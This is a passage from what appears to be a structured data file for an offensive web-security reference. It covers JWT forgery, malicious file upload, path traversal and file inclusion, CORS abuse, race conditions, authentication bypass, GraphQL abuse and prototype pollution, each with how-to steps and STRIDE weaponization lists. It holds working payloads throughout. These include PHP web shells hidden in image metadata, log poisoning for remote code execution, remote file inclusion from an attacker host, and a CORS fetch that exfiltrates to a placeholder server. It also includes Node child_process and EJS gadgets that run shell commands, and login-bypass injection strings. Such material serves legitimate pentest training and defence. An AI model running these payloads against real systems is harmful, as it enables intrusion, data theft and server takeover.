          'Once you can produce accepted tokens, edit the claims that matter: promote role or groups, change sub or id to another user, extend or ignore exp, or adjust iss and aud. Also check whether an expired token is still accepted, which is its own flaw. jwt_tool runs every attack mode against a live endpoint, and the Burp JWT Editor handles key confusion, embedded keys, and jku attacks with an interaction server for detection.',
        ],
        examples: [
          { code: "jwt_tool JWT -M at -t https://target -rh 'Authorization: Bearer JWT'", note: 'Run all attack modes against the target.' },
        ],
      },
    ],
    stride: {
      spoofing: {
        weaponization: [
          'Forge a token whose sub or username is another user and authenticate as them.',
          'Use alg none, algorithm confusion, a cracked secret, or an attacker key set to mint a token the server accepts as genuine.',
        ],
        why: 'The token is the proof of identity, so defeating its verification lets the attacker present a valid looking identity for any account.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Set role, groups, is_admin, or scope claims to privileged values in a forged token.',
          'Mint an administrator token via alg none, key confusion, a weak secret, or a controlled jku/kid key.',
          'Replay or extend tokens when expiry is not enforced to retain access.',
        ],
        why: 'Authorization is driven by the token claims, so forging those claims with a signature the server trusts grants rights the account was never assigned.',
      },
      tampering: {
        weaponization: [
          'Modify any claim the application trusts, such as id, role, scope, or exp, when the signature is not actually verified.',
          'Swap the key reference so the server validates against a key you control while you rewrite the payload.',
        ],
        why: 'When signature validation is missing or bypassable, the token stops being integrity protected, so its claims become freely editable attacker input.',
      },
    },
  },

  {
    id: 'file-upload',
    name: 'Malicious File Upload',
    summary: 'Upload a file that bypasses type checks and then executes or is abused where it lands, from a web shell to stored XSS to path traversal.',
    tags: ['server-side', 'upload'],
    executionContext: {
      where: 'Wherever the uploaded file is later used: an executable web shell runs on the application server, an uploaded HTML or SVG runs script in the victim browser, and an archive or parser payload runs inside the processing library on the server.',
      detail: 'The upload itself is passive; the impact depends on how the file is used afterward. If it lands in a web served directory whose type the server executes, a web shell runs as the application on the server. If it is served back to users, an HTML or SVG payload runs in their browser as stored XSS. If a library parses it, image, XML or SVG, archive, or config, the payload executes inside that library or writes files through path traversal on the server. The dangerous outcomes run server side as the app.',
    },
    howTo: [
      {
        heading: 'Where to look',
        body: [
          'Any feature that accepts a file: avatars and profile images, attachments, document or spreadsheet import, resume upload, and bulk import. Note where the file is stored, whether it is served back, under what path, and what processes it.',
        ],
      },
      {
        heading: 'Bypass the extension check',
        body: [
          'Filters that block a dangerous extension are often defeated by shape. Try double or compound extensions, mixed case, trailing characters the OS strips, a null byte that truncates the name, and the many alternate executable extensions per stack. Uploading a server config file can turn an innocent extension into code.',
        ],
        examples: [
          { code: "shell.php.png   shell.png.php   shell.pHp5   shell.phtml   shell.php%00.png   shell.php.  (trailing dot)", note: 'Extension confusion, case, null byte, and alternate PHP extensions.' },
          { code: ".htaccess:  AddType application/x-httpd-php .png     or IIS web.config / uWSGI .ini", note: 'Upload a config that makes the server execute your file type.' },
        ],
      },
      {
        heading: 'Bypass content type and magic byte checks',
        body: [
          'When the server checks the declared MIME type, just set the header to an allowed value. When it checks magic bytes, prepend a valid image signature and append your code, or hide the payload in EXIF metadata, or in a PNG chunk that survives a resize. Polyglot files validate as two formats at once to pass a strict filter.',
        ],
        examples: [
          { code: "Content-Type: image/png  on a PHP body     prepend the PNG or JPEG signature then <?php ... ?>", note: 'Spoof the type or the magic bytes.' },
          { code: "exiftool -Comment='<?php system($_GET[c]); ?>' img.jpg     PNG IDAT payload survives imagecopyresized", note: 'Metadata and image chunk payloads.' },
        ],
      },
      {
        heading: 'Chain into other vulnerabilities',
        body: [
          'An upload is a delivery mechanism for many bugs. An uploaded SVG or XML can carry stored XSS, XXE, or SSRF. An archive can drop files outside the target directory through zip slip traversal, a symlink, or a null byte in the entry name, and a traversal in the filename can overwrite existing files. A billion pixel image or a decompression bomb is a denial of service, and a spreadsheet field starting with an equals sign is CSV formula injection in whoever opens it.',
        ],
        examples: [
          { code: "SVG:  <svg onload=alert(document.domain)>   or an xlink href to file:///etc/passwd", note: 'Stored XSS or XXE via an uploaded SVG.' },
          { code: "Zip slip:  archive entry named ../../../var/www/html/shell.php", note: 'Traversal in an archive escapes the extraction directory.' },
        ],
      },
      {
        heading: 'Tools',
        body: [
          'The Burp Upload Scanner extension automates extension, content type, and magic byte bypass testing. evilarc builds archives with directory traversal entries, and exiftool embeds payloads in metadata. Always confirm code execution by requesting the uploaded path, not just by a successful upload response.',
        ],
      },
    ],
    stride: {
      elevation_of_privilege: {
        weaponization: [
          'Upload a web shell that executes as the application and gives remote code execution on the server.',
          'Upload a server config file (.htaccess, web.config, uWSGI .ini) that enables execution of your file type.',
          'Use an archive traversal or a config auto-processing path to drop an executable into the web root.',
          'Escalate on the host once code execution is achieved.',
        ],
        why: 'When an uploaded file reaches a code execution sink on the server, the attacker runs as the application, which is direct control of the host and its privileges.',
      },
      tampering: {
        weaponization: [
          'Overwrite existing application files by putting traversal in the filename or an archive entry.',
          'Plant a backdoor or replace content that is served to other users.',
          'Poison data through CSV or spreadsheet formula injection consumed downstream.',
        ],
        why: 'A write primitive that escapes the intended directory lets the attacker change the code and data the application and its users rely on.',
      },
      information_disclosure: {
        weaponization: [
          'Read local files with an uploaded SVG or XML that carries an XXE payload.',
          'Reach and read internal resources when the server fetches an image from a URL you supply (SSRF).',
          'Read files through a traversal in the stored path.',
        ],
        why: 'Uploaded content is parsed by server side libraries that resolve entities and paths, so a crafted file turns the parser into a file read or an internal request.',
      },
      spoofing: {
        weaponization: [
          'Upload an HTML or SVG file that is served from the application origin and runs script as stored XSS, then steal the viewer session and act as them.',
        ],
        why: 'A file served same origin executes in that origin, so an uploaded script inherits the viewer session and can impersonate them just like stored XSS.',
      },
      denial_of_service: {
        weaponization: [
          'Upload a billion pixel image that exhausts memory when the server processes it.',
          'Upload a decompression bomb that expands to fill memory or disk on extraction.',
        ],
        why: 'Server side processing of the upload does unbounded work the attacker chose, so a small file can consume disproportionate resources.',
      },
    },
  },

  {
    id: 'path-traversal-lfi',
    name: 'Path Traversal and File Inclusion (LFI/RFI)',
    summary: 'Steer a file path the server reads or includes to escape the intended directory, reading arbitrary files and, when the path is included, executing code.',
    tags: ['server-side', 'files'],
    executionContext: {
      where: 'On the application server: a read is the file access done by the app process; local file inclusion executes the included content in the server language runtime, such as a PHP include.',
      detail: 'Path traversal makes the server read or include a path the attacker steers, using the app process privileges. A pure traversal returns file contents. Local file inclusion goes further: when the app includes the path, any code in the included file runs in the server runtime, so a poisoned log, session file, wrapper, or uploaded file becomes code execution on the server. Remote file inclusion pulls the included file from a URL. None of this happens in the browser; it is server side file access and, for inclusion, server side code execution.',
    },
    howTo: [
      {
        heading: 'Where to look and basic traversal',
        body: [
          'Parameters that name a file or template are the targets: page, file, template, download, lang, path, and view, plus any include, require, or readfile sink. Start with dot dot slash sequences to climb to a known file, and try an absolute path, since some languages discard the earlier part of a joined path when they see one.',
        ],
        examples: [
          { code: "?page=../../../../etc/passwd     ?page=/etc/passwd (absolute)", note: 'Climb out of the intended directory or give an absolute path.' },
          { code: "Windows:  ?page=..\\..\\..\\windows\\win.ini     read C:\\inetpub\\wwwroot", note: 'Traversal on Windows.' },
        ],
      },
      {
        heading: 'Filter and encoding bypasses',
        body: [
          'When dot dot slash is stripped, use a nested form that survives a single non recursive pass, double URL encoding, or an overlong UTF-8 slash. Legacy stacks may accept a null byte to cut off an appended extension, or trailing path characters that the language treats as equivalent. Case tricks defeat a naive scheme or keyword block.',
        ],
        examples: [
          { code: "....//....//etc/passwd     ..%252f..%252fetc%252fpasswd     ..%c0%af..%c0%afetc%c0%afpasswd", note: 'Nested traversal, double encoding, overlong UTF-8.' },
          { code: "../../../etc/passwd%00     ../../../etc/passwd/.", note: 'Null byte and trailing character tricks on older PHP.' },
        ],
      },
      {
        heading: 'PHP wrappers to read source',
        body: [
          'On PHP, the filter wrapper reads any file and can base64 encode it so source and binary safe content return intact, and chained conversion filters can transform or, in a blind setting, leak content character by character through an oracle.',
        ],
        examples: [
          { code: "php://filter/convert.base64-encode/resource=/var/www/config.php", note: 'Read PHP source that would otherwise be executed.' },
          { code: "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd", note: 'Compress and encode to move large files.' },
        ],
      },
      {
        heading: 'Turn inclusion into code execution',
        body: [
          'When the sink includes rather than just reads, get your code into a file the server will include. Poison a web server or FTP or mail log with a payload in a header such as User-Agent, then include the log. Reach process memory through proc self environ, plant PHP into a session file and include it, or use the input, data, and expect wrappers. A phar archive triggers deserialization, and stacked PHP filters can synthesize code without any file write.',
        ],
        examples: [
          { code: "Log poison:  send User-Agent: <?php system($_GET[c]); ?>  then  ?page=../../var/log/apache2/access.log&c=id", note: 'Classic LFI to RCE through a poisoned log.' },
          { code: "?page=data://text/plain,<?php system('id');?>     ?page=php://input  with the code in the POST body     ?page=expect://id", note: 'Wrapper based code execution when enabled.' },
        ],
      },
      {
        heading: 'Remote file inclusion and tools',
        body: [
          'If remote inclusion is enabled, point the sink at a URL you host to run your file directly, or use the data wrapper to inline it. Tools such as fimap automate LFI, and a PHP filter chain oracle exploit reads files blindly when there is no visible output.',
        ],
        examples: [
          { code: "RFI:  ?page=http://YOUR/shell.txt     ?page=\\\\YOUR\\share\\shell.php", note: 'Include a remote file when allow_url_include is on.' },
        ],
      },
    ],
    stride: {
      information_disclosure: {
        weaponization: [
          'Read arbitrary local files: configuration, credentials, /etc/passwd, SSH keys, and application secrets.',
          'Read source code that would otherwise execute using the PHP filter wrapper.',
          'Read PHP session files, process environment, and cloud credential files.',
          'Extract file contents blindly through a filter chain oracle when output is not shown.',
        ],
        why: 'The read runs with the application process access to the filesystem, so steering the path exposes any file that process can read.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Turn LFI into remote code execution through log poisoning, session files, or the input, data, expect, and phar wrappers.',
          'Synthesize code with a PHP filter chain and include it without writing a file.',
          'Use remote file inclusion to run an attacker hosted file directly.',
          'Read secrets and keys, then use them to reach higher privileges.',
        ],
        why: 'An inclusion sink executes whatever it loads, so getting attacker code into an included path yields code execution as the application, and read access to secrets compounds it.',
      },
      denial_of_service: {
        weaponization: [
          'Include or read an endless device such as /dev/random so the request never completes.',
          'Include a very large file to exhaust memory.',
        ],
        why: 'The server does the reading work the attacker specifies, so pointing it at an unbounded or huge source ties up the worker and its memory.',
      },
    },
  },

  {
    id: 'cors-misconfiguration',
    name: 'CORS Misconfiguration',
    summary: 'Abuse an overly permissive cross-origin resource sharing policy so attacker JavaScript can read a victim\'s authenticated responses from another site.',
    tags: ['client-side', 'access-control'],
    executionContext: {
      where: "In the victim's browser: attacker JavaScript uses the victim's authenticated session to read a cross-origin response that the target's permissive CORS headers allow it to read.",
      detail: 'The flaw is a server side header policy: the target reflects the Origin into Access-Control-Allow-Origin with Access-Control-Allow-Credentials true, allows the null origin, or matches origins with a weak rule. The exploit runs as JavaScript on the attacker page in the victim browser: it makes a credentialed cross-origin request, and because the target headers permit it, the browser lets the attacker script read the authenticated response. So the misconfiguration is server side, but the theft executes in the victim browser and is bounded by what CORS lets scripts read.',
    },
    howTo: [
      {
        heading: 'What configurations are dangerous',
        body: [
          'The critical case is a server that reflects whatever Origin it receives into Access-Control-Allow-Origin while also sending Access-Control-Allow-Credentials true, because that lets any site read the victim authenticated responses. Whitelisting the null origin is nearly as bad, since it is easy to forge. A wildcard alone exposes only unauthenticated data because browsers refuse credentials with a wildcard. Weak origin matching that checks only a prefix or suffix, or a sloppy regex, is the common real world bug.',
        ],
      },
      {
        heading: 'How to test',
        body: [
          'Send the request with different Origin headers and watch the response for Access-Control-Allow-Origin and Access-Control-Allow-Credentials. If the server echoes your arbitrary origin with credentials allowed, it is exploitable. Fuzz origin variations to find weak matching, and try the null origin, which a sandboxed iframe produces.',
        ],
        examples: [
          { code: "Origin: https://evil.example    ->    Access-Control-Allow-Origin: https://evil.example + Allow-Credentials: true", note: 'Reflected origin with credentials is the exploitable pattern.' },
          { code: "Fuzz:  victim.com.evil.example   victim.com@evil.example   null   https://victim.com_evil.example", note: 'Weak prefix/suffix/regex matching and null origin.' },
        ],
      },
      {
        heading: 'Exploitation',
        body: [
          'Host a page that makes a credentialed request to a sensitive endpoint and, because CORS allows it, reads the response and sends it to you. If the target exposes tokens through Access-Control-Expose-Headers, read those too. For a null origin whitelist, run the same script inside a sandboxed iframe so the browser labels the origin null. When only subdomains are trusted, a single XSS on any subdomain becomes full cross origin read access.',
        ],
        examples: [
          { code: "fetch('https://victim.com/api/profile',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://YOUR/?d='+btoa(d)))", note: 'Read and exfiltrate the victim authenticated response.' },
          { code: "null origin:  run the fetch inside <iframe sandbox='allow-scripts' src='data:text/html,...'>", note: 'Sandboxed iframe yields a null origin to satisfy a null whitelist.' },
        ],
      },
      {
        heading: 'Nuances and tools',
        body: [
          'Simple GET and POST requests skip the preflight, so a permissive policy is reachable directly. A JSONP callback endpoint bypasses CORS entirely and hands data to any caller. The victim browser can also act as a proxy into an internal network where location is treated as authentication. Corsy, CORScanner, CorsMe, and the PortSwigger CORS tooling automate discovery.',
        ],
      },
    ],
    stride: {
      information_disclosure: {
        weaponization: [
          'Read a victim authenticated API response such as profile, account, or admin data and exfiltrate it.',
          'Read tokens or secrets exposed through Access-Control-Expose-Headers.',
          'Use the victim browser to reach and read internal or intranet responses that trust network location.',
          'Read the anti CSRF token from a response to enable further forged requests.',
        ],
        why: 'A permissive credentialed CORS policy lets attacker script read responses the victim is authorized to receive, so any data reachable with the victim session is disclosed cross origin.',
      },
      spoofing: {
        weaponization: [
          'Steal a session token, API key, or bearer token from the readable response and replay it to impersonate the victim.',
          'Read the CSRF token cross origin, then forge state changing requests that the server attributes to the victim.',
        ],
        why: 'Once the attacker can read authenticated material such as tokens or CSRF secrets, they can present the victim identity or act as the victim on the target.',
      },
    },
  },

  {
    id: 'race-condition',
    name: 'Race Condition (TOCTOU)',
    summary: 'Fire many nearly simultaneous requests so they interleave in the gap between a check and the action it guards, breaking a limit or state assumption.',
    tags: ['business-logic', 'concurrency'],
    executionContext: {
      where: 'In the application server and its data store, during the tiny window between when the server checks a condition and when it acts on it, while concurrent requests are processed.',
      detail: 'There is no injected code. The attacker sends many requests so close together that they interleave in the small gap between the check (balance, limit, token, state) and the action. Because each request read the same pre-action state, they all pass the check and all perform the action, so the result is a data integrity violation on the server, not anything that runs in the browser. It plays out wherever the shared state lives: the application process, a database row, or a cache.',
    },
    howTo: [
      {
        heading: 'Where to look',
        body: [
          'Any check-then-act on shared state that assumes it happens once: applying a coupon or gift card or store credit, withdrawing or transferring funds, casting a vote or rating, redeeming an invite, and per-user rate limits or anti brute force counters.',
          'Also look at hidden sub-states in multi-step flows: changing an email while it is being verified, registration that writes the account before the confirmation token, session creation that precedes MFA enforcement, and OAuth code or refresh token redemption.',
        ],
      },
      {
        heading: 'Synchronize the requests',
        body: [
          'The whole game is making requests arrive within about a millisecond of each other. Over HTTP/2 the single packet attack sends many requests in one TCP packet to remove network jitter. Over HTTP/1.1, last byte synchronization sends every request minus its final byte, then releases the withheld bytes together. Server side processing variance means you often need 20 to 30 requests, not just two.',
          'Burp Turbo Intruder automates this: use the single packet engine for HTTP/2 and the gate mechanism to withhold and then simultaneously flush the request tails.',
        ],
        examples: [
          { code: "Turbo Intruder: Engine.BURP2 (HTTP/2 single packet), or gate/openGate on HTTP/1.1", note: 'Fire the batch with sub-millisecond spread.' },
        ],
      },
      {
        heading: 'Test limit overrun and double spend',
        body: [
          'Start simple: race two identical state changing requests and alternate their order across attempts, watching for more than one to succeed. Then scale up. A coupon that applies twice, a balance that goes negative, or a second vote that counts is a confirmed race.',
        ],
        examples: [
          { code: "Send 20x  POST /cart/apply-coupon {code:SAVE10}  in one packet, check if it applied more than once.", note: 'Limit overrun via parallel identical requests.' },
        ],
      },
      {
        heading: 'Exploit hidden sub-states',
        body: [
          'The higher impact bugs live in brief unintended states. Change an email while simultaneously verifying it so the token goes to the old address but the record already shows the new one, taking over the account. Submit an empty confirmation token during the window before the real token is written. Complete login before MFA enforcement flips on. Snapshot a checkout while mutating the cart to acquire unpaid items.',
        ],
      },
      {
        heading: 'Common blockers',
        body: [
          'If the app serializes requests per session (some PHP setups), use a different session token per request. If the backend is sharded so requests hash to different nodes by cookie, IP, or object id, keep those identical across the batch so they contend on the same state. The idempotency key anti pattern (look up key, act, store result) also races, so test the same key with the same and with varied bodies.',
        ],
      },
    ],
    stride: {
      tampering: {
        weaponization: [
          'Apply a coupon, gift card, or store credit multiple times from a single grant.',
          'Withdraw or transfer more than the available balance by racing the balance check.',
          'Cast multiple votes or ratings where one is allowed.',
          'Redeem a single OAuth authorization or refresh token for multiple valid token pairs.',
          'Acquire unpaid items by racing a checkout snapshot against cart or coupon changes.',
        ],
        why: 'Concurrent requests all read the same pre-action state and all pass the check, so a limit or balance that the application enforces only once is violated, corrupting integrity at the source of truth.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Confirm an account without the email token by racing the brief window where the token is still null.',
          'Bypass MFA enforcement when the session is created before the MFA requirement is applied.',
          'Complete a privileged action before an authorization or approval step commits.',
        ],
        why: 'When a security gate (confirmation, MFA, approval) is applied a step after the state it protects is written, racing that step lets the attacker slip through before the gate is enforced.',
      },
      spoofing: {
        weaponization: [
          'Take over another account by racing an email change against its verification so you control the verified address.',
          'Retain valid tokens for a victim by racing token issuance, so revoking one leaves others active.',
        ],
        why: 'A race that binds an attacker controlled address or token to a victim account lets the attacker authenticate as that victim afterward.',
      },
    },
  },

  {
    id: 'authentication-bypass',
    name: 'Authentication Bypass',
    summary: 'Reach authenticated functionality without valid credentials by satisfying, skipping, or forcing the auth check, or because the only check is client side.',
    tags: ['authentication'],
    executionContext: {
      where: "On the server's authentication and session logic, except for single page apps whose only guard is client side, where the check never reaches the server at all.",
      detail: 'Authentication bypass is a class, and the common thread is getting in without valid credentials. Most variants exploit a server side check that can be satisfied, skipped, or forced true: injection in the login query, loose or type juggled comparisons, missing rate limiting, response manipulation, or forced browsing to endpoints that never re-check identity. A distinct sub-class is client side only auth, where the gate lives in JavaScript and the backend never verifies, so calling the API directly or flipping a stored flag grants access in the browser.',
    },
    howTo: [
      {
        heading: 'Weak, default, and injectable credentials',
        body: [
          'Try default and common credentials first (admin/admin, the technology default account, the product name as password), and build a target specific list. Then test injection auth bypass in the login: a SQL or NoSQL or LDAP or XPath tautology that makes the identity check always true (see the SQL Injection and NoSQL Injection entries).',
        ],
        examples: [
          { code: "SQLi:  username=admin'-- -   LDAP:  *)(&   XPath:  ' or '1'='1", note: 'Force the login check to pass for a known or first user.' },
        ],
      },
      {
        heading: 'Parameter and type tricks',
        body: [
          'Send the request in shapes the comparison mishandles. Omit a parameter, or send arrays so a loose comparison misbehaves, or exploit a language quirk that makes the password check always true. Switching the body to JSON on an endpoint that expected a form sometimes reaches a different, weaker code path.',
        ],
        examples: [
          { code: "PHP:  user[]=a&pwd[]=b   Node:  {\"password\":{\"password\":1}}   loose ==  0 == 'string'", note: 'Type juggling and array parameters bypass a weak comparison.' },
        ],
      },
      {
        heading: 'No rate limiting, response, and session flaws',
        body: [
          'When there is no throttling, brute force and credential stuffing become viable, so test whether repeated failures are ever slowed or locked. Watch the response too: some clients trust a field like success or role from the response body, which you can flip in a proxy, or you can change a 401 or 403 into a 200. Weak remember me tokens, predictable session ids, and session fixation (getting the victim to use a session you set) are all bypass paths.',
        ],
      },
      {
        heading: 'Forced browsing and client side only auth',
        body: [
          'Try requesting authenticated pages and API endpoints directly, since the application may only hide the link rather than enforce access on the server. For single page apps, read the JavaScript bundle for flags such as authRequired, role, is_admin, or values pulled from local storage, then forge those values or intercept the response, because if the backend never verifies, the client side gate is the only thing stopping you.',
        ],
        examples: [
          { code: "Forced browse:  request /admin/users directly with your normal session.", note: 'The server may never re-check authorization for the hidden page.' },
          { code: "SPA:  set localStorage role=admin or flip an is_authenticated response field.", note: 'Client side only auth trusts values the attacker controls.' },
        ],
      },
    ],
    stride: {
      spoofing: {
        weaponization: [
          'Log in as a specific user through injection, default credentials, or credential stuffing.',
          'Forge a client side auth flag or token the SPA trusts to assume an identity.',
          'Replay a weak or predictable remember me token to become that user.',
          'Use session fixation to ride a session the victim later authenticates.',
        ],
        why: 'Each of these satisfies the identity check without the real credentials, so the application treats the attacker as a legitimate authenticated user.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Force browse to admin only pages and endpoints that never re-check authorization.',
          'Flip a role or is_admin flag that a client side or response trusting app believes.',
          'Brute force an administrator account when there is no rate limiting.',
          'Bypass the login query to authenticate as the first or an admin user.',
        ],
        why: 'When the check that separates users from administrators is missing, client side, or bypassable, defeating it grants access to functionality the account was never authorized for.',
      },
    },
  },

  {
    id: 'graphql-abuse',
    name: 'GraphQL API Abuse',
    summary: 'Abuse a GraphQL endpoint through introspection, missing per-object authorization, batching, and unbounded query cost to read, change, or exhaust the backend.',
    tags: ['api', 'server-side'],
    executionContext: {
      where: 'In the GraphQL server and its resolvers on the application server: queries are parsed and executed by resolvers that read and mutate data and call downstream systems.',
      detail: 'GraphQL exposes one flexible endpoint whose resolvers run on the application server. The attacks are about what the schema and resolvers let you ask for: reading the schema, requesting objects you should not, running mutations, or forcing expensive work. Injection through a resolver (SQL, SSRF, command) runs wherever that resolver backend runs. Nothing executes in the browser; the flaws are an over-permissive schema, missing per-object authorization, and missing query-cost limits on the server.',
    },
    howTo: [
      {
        heading: 'Detect, fingerprint, and map the schema',
        body: [
          'Find the endpoint by sending a typename query to common paths, then fingerprint the engine to line it up with known CVEs. Map the schema with introspection. When introspection is disabled, try a whitespace or WebSocket bypass, reconstruct the schema from error message field suggestions with clairvoyance or InQL, or read the front end JavaScript for embedded queries.',
        ],
        examples: [
          { code: "Detect:  {\"query\":\"query{__typename}\"}  to /graphql, /api/graphql, /graphiql", note: 'A __typename reply confirms GraphQL.' },
          { code: "Introspect:  query={__schema{types{name,fields{name,args{name,type{name,kind,ofType{name,kind}}}}}}}", note: 'Dump the full schema when introspection is on.' },
        ],
      },
      {
        heading: 'Read data and IDOR (broken object level authorization)',
        body: [
          'Query root types directly and fetch fields the UI never exposes. Brute force object ids to read other users records, and try an empty string search, which often returns every record. This is IDOR at the field level: the resolver returns the object by id without checking you own it.',
        ],
        examples: [
          { code: "query={user(uid:1){username,email,password}}   then iterate uid", note: 'Object level authorization is often missing on id lookups.' },
          { code: "query={users(search:\"\"){username,email}}", note: 'Empty search frequently dumps the whole table.' },
        ],
      },
      {
        heading: 'Mutations and authorization bypass',
        body: [
          'Mutations change state, and their authorization is frequently weaker than the UI implies. Test whether a mutation enforces ownership and role, and try chaining an extra operation onto a restricted one so the second runs in the same request.',
        ],
        examples: [
          { code: "mutation { forgotPassword(email:\"victim@x\") register(name:\"me\",email:\"me@x\") }", note: 'Chained operations can slip past a guard on the first.' },
        ],
      },
      {
        heading: 'Bypass rate limits and 2FA with aliases and batching',
        body: [
          'GraphQL lets you run many operations in one HTTP request, which defeats per request rate limiting. Use aliases to repeat an operation hundreds of times, or send a JSON array of queries. This turns a throttled brute force, such as guessing an OTP or a discount code, into one request that tries many values.',
        ],
        examples: [
          { code: "{ a0:checkOtp(code:\"0000\"){ok} a1:checkOtp(code:\"0001\"){ok} ... }", note: 'Alias batching brute forces a code past a per-request limit.' },
        ],
      },
      {
        heading: 'Denial of service and resolver injection',
        body: [
          'Without query cost limits, a small query can force huge work: deeply nested or recursive fragments, hundreds of aliases, duplicated fields and directives, or thousands of deferred fields. Separately, a resolver argument that reaches a database, an internal request, or a shell is SQL injection, SSRF, or command injection through GraphQL, and file upload scalars and persisted query bypass add more surface.',
        ],
        examples: [
          { code: "DoS:  fragment A on Query{...B} fragment B on Query{...A} query{...A}", note: 'Recursive fragments blow past depth limits.' },
          { code: "Resolver injection:  a filter or id arg that reaches SQL/SSRF/command downstream.", note: 'GraphQL is just the front door to the same injection sinks.' },
        ],
      },
      {
        heading: 'Tools',
        body: [
          'graphw00f fingerprints the engine, InQL and graphql-cop find misconfigurations and auto generate queries, clairvoyance rebuilds a schema without introspection, graphqlmap automates attacks, and batchql audits batching. Server side, graphql-armor enforces depth, alias, field, and cost limits.',
        ],
      },
    ],
    stride: {
      information_disclosure: {
        weaponization: [
          'Dump the full schema through introspection, or reconstruct it from error suggestions when introspection is disabled.',
          'Read other users objects by brute forcing ids (broken object level authorization).',
          'Return every record with an empty string search.',
          'Over-fetch related data and fields the UI never surfaces in one query.',
        ],
        why: 'A flexible query language plus resolvers that return objects by id without an ownership check lets the attacker ask for far more data than any screen exposes.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Run mutations that lack proper authorization to change roles, ownership, or protected data.',
          'Chain an extra operation onto a restricted mutation so it executes past the guard.',
          'Reach remote code execution or SSRF through a vulnerable resolver argument.',
        ],
        why: 'Mutations and resolvers execute on the server, so a missing authorization check or an injectable resolver turns query access into privileged action or code execution.',
      },
      denial_of_service: {
        weaponization: [
          'Send deeply nested or recursive fragment queries that explode in cost.',
          'Overload the request with hundreds of aliases or duplicated fields and directives.',
          'Abuse incremental delivery (@defer) to amplify a single query into thousands of chunks.',
        ],
        why: 'Without a query cost or depth limit, a tiny request forces the server to do unbounded resolver work, so one client can exhaust the backend.',
      },
      tampering: {
        weaponization: [
          'Use unauthorized mutations to modify data that belongs to other users or the application.',
          'Write to other users objects through broken object level authorization.',
          'Abuse file upload mutations to place attacker content.',
        ],
        why: 'When mutations do not enforce ownership and authorization, the same flexible interface that reads data can also change it beyond the attacker scope.',
      },
    },
  },
  {
    id: 'prototype-pollution',
    name: 'Prototype Pollution',
    summary: 'Inject __proto__ or constructor.prototype keys into an object so the value lands on the shared prototype, then abuse the poisoned prototype to change application behavior, forge privileged flags, reach server-side code execution through gadgets, or crash the process.',
    tags: ['server-side', 'client-side', 'javascript'],
    executionContext: {
      where: 'In a JavaScript runtime, mutating a shared prototype (almost always Object.prototype). Server-side pollution runs inside the Node.js process on the application server; client-side pollution runs in the victim browser in the site origin. The polluting write happens wherever unsafe recursive assignment runs, and the payoff happens later wherever any other code reads the poisoned property.',
      detail: 'Every JavaScript object inherits from a prototype, and nearly all objects share the same Object.prototype at the top of the chain. When code walks an attacker controlled key path and assigns into an object (a recursive merge, a deep clone, or setting a nested property from a string path) and does not block the special keys __proto__, constructor, and prototype, the write escapes the target object and lands on the prototype that every other object inherits from. From that moment, any code anywhere in the same runtime that reads a property which is missing on an instance receives the attacker value instead of undefined. The pollution itself produces no visible effect; the damage happens in a second location, a gadget, where some unrelated code trusts a property it never set. Server-side the runtime is the Node.js process, so gadgets can reach configuration, template compilation, or child_process options and become code execution. Client-side the runtime is the browser page, so gadgets in the site own scripts or its libraries become DOM XSS and logic bypass in the site origin. Because the change is on the shared prototype it persists for the life of the runtime and affects later, unrelated requests.',
    },
    howTo: [
      {
        heading: 'Confirm pollution and find the sink',
        body: [
          'The vulnerable code is any recursive merge, clone, or path based property setter that copies untrusted keys into an object. Look for merge, extend, clone, defaultsDeep, or a helper that turns a dotted string into a nested assignment. Confirm pollution by writing a marker onto the prototype and reading it back from an unrelated fresh object.',
        ],
        examples: [
          { code: "Node REPL check:  const o={}; merge(o, JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}')); ({}).polluted === \"yes\"", note: 'A brand new empty object now carries the value, proving the write hit Object.prototype.' },
          { code: "Browser check:  location.hash payload ?__proto__[polluted]=yes  then read  Object.prototype.polluted", note: 'Vulnerable query-string and hash parsers set nested keys straight onto the prototype.' },
        ],
      },
      {
        heading: 'Server-side injection vectors',
        body: [
          'On the server the payload arrives as JSON, as URL encoded form fields, or as query parameters, and reaches a merge into a config or options object. Use a nested __proto__ object in JSON, or bracket and dotted notation in query and form bodies. When introspection into the app is blind, detect pollution by poisoning a property that visibly changes a response, such as the Express JSON indentation option, then narrow to a real gadget.',
        ],
        examples: [
          { code: "POST body:  {\"__proto__\":{\"isAdmin\":true}}   or   {\"constructor\":{\"prototype\":{\"isAdmin\":true}}}", note: 'Two ways to reach the same prototype; the constructor.prototype form survives naive __proto__ filters.' },
          { code: "Query/form:  ?__proto__[json spaces]=10   then observe the response JSON is suddenly indented", note: 'Blind server-side detection: polluting the Express json spaces default reformats every JSON response.' },
        ],
      },
      {
        heading: 'Server-side gadgets to remote code execution',
        body: [
          'A gadget is code that reads an option from an object without setting it first, so the polluted default flows in. The classic sink is child_process: when the app later spawns a process, poison the options it reads (shell, argv0, env, and NODE_OPTIONS) so Node is relaunched with an attacker controlled require. Template engines are another rich sink because they read internal defaults from objects: Handlebars can be driven by injecting a pre-parsed AST, Pug by a block property, and EJS by outputFunctionName or escapeFunction. The pollution sets the trap; the next legitimate spawn or render springs it.',
        ],
        examples: [
          { code: "child_process gadget:  {\"__proto__\":{\"shell\":\"node\",\"NODE_OPTIONS\":\"--require /proc/self/environ\",\"env\":{\"a\":\"require('child_process').execSync('id')//\"}}}", note: 'When the app spawns any child, Node re-executes with the injected require and runs the attacker code.' },
          { code: "EJS gadget:  {\"__proto__\":{\"outputFunctionName\":\"x;process.mainModule.require('child_process').execSync('id');//\"}}", note: 'The polluted option is spliced into the compiled template function on the next render.' },
        ],
      },
      {
        heading: 'Client-side pollution to DOM XSS and check bypass',
        body: [
          'In the browser the vector is usually a vulnerable URL parser (query string, hash, or a JSON blob from the server) feeding a script that merges options. A client-side gadget is any code that reads a config property it did not fully control and then feeds it to an HTML sink or a security check. Poison a property an HTML sink reads to get script execution in the site origin, or poison the property a guard tests so the check passes.',
        ],
        examples: [
          { code: "DOM XSS:  ?__proto__[src]=data:,alert(document.domain)   feeding a library that builds a script/iframe from options.src", note: 'The sanitizer or template reads the inherited src and injects it, running script in the origin.' },
          { code: "Check bypass:  ?__proto__[isAdmin]=1   so a later  if (user.isAdmin)  reads the inherited value", note: 'Any client check that fetches a missing property now sees the attacker value.' },
        ],
